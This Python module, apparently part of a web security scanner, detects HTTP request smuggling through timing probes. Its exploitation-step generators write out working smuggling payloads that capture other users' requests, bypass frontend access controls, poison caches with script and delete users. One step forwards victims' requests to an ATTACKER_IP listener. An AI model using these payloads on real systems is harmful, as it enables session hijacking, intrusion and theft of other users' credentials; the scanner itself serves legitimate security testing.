"""
HTTP Request Smuggling Detection Scanner
Detects CL.TE, TE.CL, and TE.TE smuggling vulnerabilities with zero false positives

Detection Strategy:
1. Timing-based detection - smuggled requests cause delays
2. Differential response detection - different responses indicate desync
3. Multi-stage verification - confirm with multiple techniques before reporting

Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
"""

from core.base_module import BaseModule
from core.logger import get_logger
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import socket
import ssl
import time
import re

logger = get_logger(__name__)


class RequestSmugglingScanner(BaseModule):
    """Scans for HTTP Request Smuggling vulnerabilities with high confidence"""

    def __init__(self, module_path: str, payload_limit: int = None):
        super().__init__(module_path, payload_limit=payload_limit)
        self.module_name = "Request Smuggling Scanner"
        self.logger = logger

        # Timing thresholds (in seconds)
        self.baseline_timeout = 5
        self.smuggle_timeout = 10
        self.timing_threshold = 3  # Must be 3+ seconds slower to indicate smuggling

        # Confidence thresholds
        self.min_confidence = 0.85  # Only report if confidence >= 85%

    def scan(self, targets: List[Dict[str, Any]], http_client: Any = None) -> List[Dict[str, Any]]:
        """Scan for HTTP Request Smuggling vulnerabilities"""
        self.logger.info(f"Starting {self.module_name} scan on {len(targets)} targets")

        results = []
        tested_hosts = set()

        for target in targets:
            url = target.get('url') if isinstance(target, dict) else target
            if not url:
                continue

            parsed = urlparse(url)
            host = parsed.netloc
            scheme = parsed.scheme

            # Only test each host once
            host_key = f"{scheme}://{host}"
            if host_key in tested_hosts:
                continue
            tested_hosts.add(host_key)

            self.logger.info(f"Testing {host_key} for request smuggling...")

            # Run smuggling tests
            findings = self._test_smuggling(parsed)
            results.extend(findings)

            if self.payload_limit and len(results) >= self.payload_limit:
                break

        self.logger.info(f"{self.module_name} scan complete: {len(results)} findings")
        return results

    def _test_smuggling(self, parsed_url) -> List[Dict[str, Any]]:
        """Run all smuggling tests against a target"""
        results = []
        host = parsed_url.netloc
        port = 443 if parsed_url.scheme == 'https' else 80
        use_ssl = parsed_url.scheme == 'https'
        path = parsed_url.path or '/'

        # Extract hostname without port
        hostname = host.split(':')[0] if ':' in host else host
        if ':' in host:
            port = int(host.split(':')[1])

        # Test 1: CL.TE Detection (Content-Length takes precedence on frontend, Transfer-Encoding on backend)
        cl_te_result = self._test_cl_te(hostname, port, use_ssl, path, host)
        if cl_te_result:
            results.append(cl_te_result)

        # Test 2: TE.CL Detection (Transfer-Encoding takes precedence on frontend, Content-Length on backend)
        te_cl_result = self._test_te_cl(hostname, port, use_ssl, path, host)
        if te_cl_result:
            results.append(te_cl_result)

        # Test 3: TE.TE Detection (Both support TE but one can be obfuscated)
        te_te_result = self._test_te_te(hostname, port, use_ssl, path, host)
        if te_te_result:
            results.append(te_te_result)

        return results

    def _test_cl_te(self, hostname: str, port: int, use_ssl: bool, path: str, host: str) -> Optional[Dict[str, Any]]:
        """
        Test for CL.TE smuggling using timing-based detection.

        Technique: Send a request where CL says body is complete but TE says more data coming.
        If backend uses TE, it will wait for the chunk terminator, causing a timeout.
        """
        url = f"{'https' if use_ssl else 'http'}://{host}{path}"

        # Stage 1: Baseline timing (normal request)
        baseline_time = self._measure_request_time(hostname, port, use_ssl, path, host, "normal")
        if baseline_time is None:
            return None

        # Stage 2: CL.TE timing attack
        # Content-Length: 4 says body is "1\r\n" (4 bytes including CRLF)
        # But Transfer-Encoding: chunked expects "0\r\n\r\n" terminator
        # If backend uses TE, it will timeout waiting for terminator

        cl_te_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q"  # Incomplete chunk - backend using TE will wait
        )

        attack_time = self._send_raw_request(hostname, port, use_ssl, cl_te_payload, timeout=self.smuggle_timeout)

        if attack_time is None:
            return None

        # Stage 3: Verify - attack should take significantly longer than baseline
        time_diff = attack_time - baseline_time

        self.logger.debug(f"CL.TE test: baseline={baseline_time:.2f}s, attack={attack_time:.2f}s, diff={time_diff:.2f}s")

        if time_diff >= self.timing_threshold:
            # Stage 4: Confirmation - run attack again to verify consistency
            confirm_time = self._send_raw_request(hostname, port, use_ssl, cl_te_payload, timeout=self.smuggle_timeout)

            if confirm_time and (confirm_time - baseline_time) >= self.timing_threshold:
                confidence = min(0.95, 0.85 + (time_diff / 10) * 0.1)

                return self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='HTTP Headers',
                    payload='CL.TE Smuggling',
                    evidence=f"CL.TE Request Smuggling confirmed via timing attack. "
                             f"Baseline: {baseline_time:.2f}s, Attack: {attack_time:.2f}s, "
                             f"Difference: {time_diff:.2f}s (threshold: {self.timing_threshold}s)",
                    severity='Critical',
                    method='POST',
                    exploitation_steps=self._generate_cl_te_exploit_steps(hostname, port, use_ssl, path, host),
                    additional_info={
                        'injection_type': 'HTTP Request Smuggling (CL.TE)',
                        'technique': 'Timing-based detection',
                        'baseline_time': round(baseline_time, 2),
                        'attack_time': round(attack_time, 2),
                        'time_difference': round(time_diff, 2),
                        'confidence': round(confidence, 2),
                        'description': 'Frontend uses Content-Length, Backend uses Transfer-Encoding',
                        'impact': 'Request smuggling allows bypassing security controls, cache poisoning, credential hijacking',
                        'cwe': 'CWE-444',
                        'owasp': 'A05:2021',
                        'remediation': 'Configure frontend and backend to use the same parsing method. Reject ambiguous requests.',
                        'poc': self._generate_cl_te_poc(host, path)
                    }
                )

        return None

    def _test_te_cl(self, hostname: str, port: int, use_ssl: bool, path: str, host: str) -> Optional[Dict[str, Any]]:
        """
        Test for TE.CL smuggling using timing-based detection.

        Technique: Send a chunked request where TE says complete but CL says more data.
        If backend uses CL, it will wait for more data, causing a timeout.
        """
        url = f"{'https' if use_ssl else 'http'}://{host}{path}"

        # Stage 1: Baseline timing
        baseline_time = self._measure_request_time(hostname, port, use_ssl, path, host, "normal")
        if baseline_time is None:
            return None

        # Stage 2: TE.CL timing attack
        # Transfer-Encoding says body is complete (0\r\n\r\n)
        # But Content-Length: 6 says expect 6 more bytes
        # If backend uses CL, it will timeout waiting for more data

        body = "0\r\n\r\n"
        te_cl_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        )

        attack_time = self._send_raw_request(hostname, port, use_ssl, te_cl_payload, timeout=self.smuggle_timeout)

        if attack_time is None:
            return None

        time_diff = attack_time - baseline_time

        self.logger.debug(f"TE.CL test: baseline={baseline_time:.2f}s, attack={attack_time:.2f}s, diff={time_diff:.2f}s")

        if time_diff >= self.timing_threshold:
            # Confirmation run
            confirm_time = self._send_raw_request(hostname, port, use_ssl, te_cl_payload, timeout=self.smuggle_timeout)

            if confirm_time and (confirm_time - baseline_time) >= self.timing_threshold:
                confidence = min(0.95, 0.85 + (time_diff / 10) * 0.1)

                return self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='HTTP Headers',
                    payload='TE.CL Smuggling',
                    evidence=f"TE.CL Request Smuggling confirmed via timing attack. "
                             f"Baseline: {baseline_time:.2f}s, Attack: {attack_time:.2f}s, "
                             f"Difference: {time_diff:.2f}s",
                    severity='Critical',
                    method='POST',
                    exploitation_steps=self._generate_te_cl_exploit_steps(hostname, port, use_ssl, path, host),
                    additional_info={
                        'injection_type': 'HTTP Request Smuggling (TE.CL)',
                        'technique': 'Timing-based detection',
                        'baseline_time': round(baseline_time, 2),
                        'attack_time': round(attack_time, 2),
                        'time_difference': round(time_diff, 2),
                        'confidence': round(confidence, 2),
                        'description': 'Frontend uses Transfer-Encoding, Backend uses Content-Length',
                        'impact': 'Request smuggling allows bypassing security controls, cache poisoning, credential hijacking',
                        'cwe': 'CWE-444',
                        'owasp': 'A05:2021',
                        'remediation': 'Configure frontend and backend to use the same parsing method. Reject ambiguous requests.',
                        'poc': self._generate_te_cl_poc(host, path)
                    }
                )

        return None

    def _test_te_te(self, hostname: str, port: int, use_ssl: bool, path: str, host: str) -> Optional[Dict[str, Any]]:
        """
        Test for TE.TE smuggling using obfuscated Transfer-Encoding headers.

        Technique: Use malformed TE header that one server accepts and another rejects.
        """
        url = f"{'https' if use_ssl else 'http'}://{host}{path}"

        # TE obfuscation variants
        te_obfuscations = [
            "Transfer-Encoding: chunked\r\nTransfer-encoding: cow",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: chunked\r\n Transfer-Encoding: x",
            "X: X\r\nTransfer-Encoding: chunked",
        ]

        baseline_time = self._measure_request_time(hostname, port, use_ssl, path, host, "normal")
        if baseline_time is None:
            return None

        for te_variant in te_obfuscations:
            # Create payload with obfuscated TE
            te_te_payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_variant}\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"Q"
            )

            attack_time = self._send_raw_request(hostname, port, use_ssl, te_te_payload, timeout=self.smuggle_timeout)

            if attack_time is None:
                continue

            time_diff = attack_time - baseline_time

            if time_diff >= self.timing_threshold:
                # Confirmation
                confirm_time = self._send_raw_request(hostname, port, use_ssl, te_te_payload, timeout=self.smuggle_timeout)

                if confirm_time and (confirm_time - baseline_time) >= self.timing_threshold:
                    confidence = min(0.90, 0.80 + (time_diff / 10) * 0.1)

                    return self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter='HTTP Headers',
                        payload=f'TE.TE Smuggling ({te_variant[:30]}...)',
                        evidence=f"TE.TE Request Smuggling detected with obfuscated header. "
                                 f"Variant: {te_variant.split(chr(13))[0]}",
                        severity='Critical',
                        method='POST',
                        additional_info={
                            'injection_type': 'HTTP Request Smuggling (TE.TE)',
                            'technique': 'TE header obfuscation',
                            'te_variant': te_variant,
                            'time_difference': round(time_diff, 2),
                            'confidence': round(confidence, 2),
                            'description': 'Both servers support TE but handle malformed headers differently',
                            'cwe': 'CWE-444',
                            'owasp': 'A05:2021'
                        }
                    )

        return None

    def _measure_request_time(self, hostname: str, port: int, use_ssl: bool,
                               path: str, host: str, request_type: str) -> Optional[float]:
        """Measure baseline request time"""
        normal_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        return self._send_raw_request(hostname, port, use_ssl, normal_request, timeout=self.baseline_timeout)

    def _send_raw_request(self, hostname: str, port: int, use_ssl: bool,
                          request: str, timeout: int = 10) -> Optional[float]:
        """Send raw HTTP request and measure response time"""
        start_time = time.time()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=hostname)

            sock.connect((hostname, port))
            sock.sendall(request.encode())

            # Try to receive response
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 10000:  # Limit response size
                        break
            except socket.timeout:
                pass  # Timeout is expected for smuggling detection

            sock.close()

        except socket.timeout:
            # Timeout indicates potential smuggling (server waiting for more data)
            return timeout
        except Exception as e:
            self.logger.debug(f"Socket error: {e}")
            return None

        elapsed = time.time() - start_time
        return elapsed

    def _generate_cl_te_poc(self, host: str, path: str) -> str:
        """Generate CL.TE proof of concept"""
        return f'''# CL.TE Request Smuggling PoC
# Use with netcat or similar: cat poc.txt | nc -q1 {host.split(':')[0]} 80

POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED'''

    def _generate_te_cl_poc(self, host: str, path: str) -> str:
        """Generate TE.CL proof of concept"""
        return f'''# TE.CL Request Smuggling PoC
# Use with netcat or similar: cat poc.txt | nc -q1 {host.split(':')[0]} 80

POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

'''

    def _generate_cl_te_exploit_steps(self, hostname: str, port: int, use_ssl: bool, path: str, host: str) -> List[str]:
        """Generate step-by-step CL.TE exploitation guide with real target data"""
        protocol = "https" if use_ssl else "http"
        nc_cmd = f"openssl s_client -connect {hostname}:{port}" if use_ssl else f"nc {hostname} {port}"

        return [
            f"STEP 1: VERIFY THE VULNERABILITY\n"
            f"─────────────────────────────────\n"
            f"Target: {protocol}://{host}{path}\n"
            f"Type: CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)\n\n"
            f"Run this command to confirm:\n"
            f"$ echo -e 'POST {path} HTTP/1.1\\r\\nHost: {host}\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nZ\\r\\nQ' | {nc_cmd}\n\n"
            f"Expected: Request should timeout (backend waiting for chunk terminator)",

            f"STEP 2: CAPTURE ANOTHER USER'S REQUEST\n"
            f"──────────────────────────────────────\n"
            f"Save this to smuggle_capture.txt:\n\n"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 130\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\n"
            f"POST /capture HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 500\r\n\r\n"
            f"data=\n\n"
            f"Execute: cat smuggle_capture.txt | {nc_cmd}\n"
            f"Next legitimate user's request will be appended to 'data=' parameter",

            f"STEP 3: BYPASS FRONTEND SECURITY CONTROLS\n"
            f"─────────────────────────────────────────\n"
            f"If /admin is blocked by frontend, smuggle a request to access it:\n\n"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 56\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Forwarded-For: 127.0.0.1\r\n\r\n",

            f"STEP 4: CACHE POISONING ATTACK\n"
            f"──────────────────────────────\n"
            f"Poison the cache to serve malicious content:\n\n"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 200\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\n"
            f"GET /static/main.js HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 50\r\n\r\n"
            f"<script>alert('XSS via Cache Poisoning')</script>\n\n"
            f"This smuggles a request that poisons /static/main.js in the cache",

            f"STEP 5: CREDENTIAL HIJACKING\n"
            f"────────────────────────────\n"
            f"Redirect victim's POST request to attacker-controlled endpoint:\n\n"
            f"1. Set up listener: nc -lvp 8080\n"
            f"2. Send smuggled request:\n\n"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 100\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\n"
            f"POST http://ATTACKER_IP:8080/steal HTTP/1.1\r\n"
            f"Host: ATTACKER_IP\r\n"
            f"Content-Length: 1000\r\n\r\n\n\n"
            f"Victim's next request (with cookies/credentials) will be sent to attacker",

            f"TOOLS FOR EXPLOITATION\n"
            f"──────────────────────\n"
            f"• Burp Suite Turbo Intruder: Use smuggle-probe.py script\n"
            f"• smuggler.py: https://github.com/defparam/smuggler\n"
            f"• HTTP Request Smuggler Burp Extension\n\n"
            f"Command to run smuggler:\n"
            f"$ python3 smuggler.py -u {protocol}://{host}{path}"
        ]

    def _generate_te_cl_exploit_steps(self, hostname: str, port: int, use_ssl: bool, path: str, host: str) -> List[str]:
        """Generate step-by-step TE.CL exploitation guide with real target data"""
        protocol = "https" if use_ssl else "http"
        nc_cmd = f"openssl s_client -connect {hostname}:{port}" if use_ssl else f"nc {hostname} {port}"

        return [
            f"STEP 1: VERIFY THE VULNERABILITY\n"
            f"─────────────────────────────────\n"
            f"Target: {protocol}://{host}{path}\n"
            f"Type: TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)\n\n"
            f"Run this command to confirm:\n"
            f"$ echo -e 'POST {path} HTTP/1.1\\r\\nHost: {host}\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\n' | {nc_cmd}\n\n"
            f"Expected: Request should timeout (backend waiting for more data per Content-Length)",

            f"STEP 2: SMUGGLE A GET REQUEST\n"
            f"─────────────────────────────\n"
            f"TE.CL smuggling payload format:\n\n"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"5c\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: text/plain\r\n"
            f"Content-Length: 10\r\n\r\n"
            f"x=\r\n"
            f"0\r\n\r\n\n"
            f"Note: '5c' is the hex length of the smuggled request chunk",

            f"STEP 3: CAPTURE CREDENTIALS\n"
            f"───────────────────────────\n"
            f"Create a request that captures the next user's request body:\n\n"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"A8\r\n"  # Chunk size (168 in decimal)
            f"POST /log HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 300\r\n\r\n"
            f"stolen=\r\n"
            f"0\r\n\r\n\n"
            f"The 'stolen' parameter will contain the victim's request",

            f"STEP 4: BYPASS WAF/SECURITY\n"
            f"───────────────────────────\n"
            f"Frontend may block requests to /admin, but smuggled request bypasses:\n\n"
            f"Blocked by frontend: GET /admin HTTP/1.1\n"
            f"Allowed (smuggled): Backend processes it as internal request\n\n"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"48\r\n"
            f"GET /admin/delete-user?id=1 HTTP/1.1\r\n"
            f"Host: localhost\r\n\r\n"
            f"0\r\n\r\n",

            f"STEP 5: WEB CACHE DECEPTION\n"
            f"───────────────────────────\n"
            f"Trick cache into storing sensitive response:\n\n"
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n\r\n"
            f"45\r\n"
            f"GET /profile HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Cache-Key: /static/img.png\r\n\r\n"
            f"0\r\n\r\n\n"
            f"Cache might store /profile response under /static/img.png key",

            f"TOOLS FOR EXPLOITATION\n"
            f"──────────────────────\n"
            f"• Calculate chunk size: python3 -c \"print(hex(len(b'YOUR_SMUGGLED_REQUEST')))\"\n"
            f"• Burp Suite: Use Turbo Intruder with smuggle-probe.py\n"
            f"• smuggler.py: python3 smuggler.py -u {protocol}://{host}{path}\n"
            f"• http-request-smuggler: https://github.com/PortSwigger/http-request-smuggler"
        ]


def get_module(module_path: str, payload_limit: int = None):
    """Factory function to create module instance"""
    return RequestSmugglingScanner(module_path, payload_limit=payload_limit)
